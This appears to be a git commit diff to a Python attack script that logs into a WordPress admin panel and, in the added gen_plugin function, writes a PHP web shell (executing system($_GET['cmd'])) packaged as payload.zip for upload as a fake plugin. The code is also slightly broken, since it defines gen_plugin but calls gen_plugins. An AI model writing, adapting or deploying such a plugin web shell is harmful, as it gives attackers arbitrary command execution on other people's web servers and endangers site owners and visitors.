f0fe68740ed9ca56b2690526bfb5bded18c59a1f
4nh4ck1n3 <leandre.star@gmail.com>
2023-12-20 14:08:38 +0100

    add- def gen_plugin

--- jumbo.py
+++ jumbo.py
@@ -1,4 +1,6 @@
 import requests
+import zipfile
+
 
 def login(user, password, url):
     urll = f'{url}wp-login.php'
@@ -9,15 +11,37 @@ def login(user, password, url):
         'redirect_to': f'{url}/wp-admin/index.php',
         'testcookie': '1'
     }  
-    r = requests.post(url=urll, data=data,  allow_redirects=True)
+    r = requests.post(urll, data,  allow_redirects=True)
     if r.status_code == 200:  
         return True
     else: 
         return False
 
 
-user = input('enter wp user: ')
-password = input('enter wp pass: ')
-url = input('enter wp url: ')
-login_wp = login(user, password, url) 
-print(login_wp)
+def gen_plugin(): 
+    php_code = """<?php
+if(isset($_GET['cmd']))
+{
+    system($_GET['cmd']);
+}
+?>"""
+    with open("plugins.php", "w") as php_file:
+        php_file.write(php_code)
+        print('[*] genereta plugins...')
+    zip = 'payload.zip'
+
+    with zipfile.ZipFile(zip, 'w') as zip_file:
+        zip_file.write("plugins.php")
+        print('[+] plugins was generate.')
+    
+    return(f'[+] payload name: {zip}')
+
+print(gen_plugins())
+
+
+#user = input('enter wp user: ')
+#password = input('enter wp pass: ')
+#url = input('enter wp url: ')
+#login_wp = login(user, password, url) 
+#print(login_wp)
+
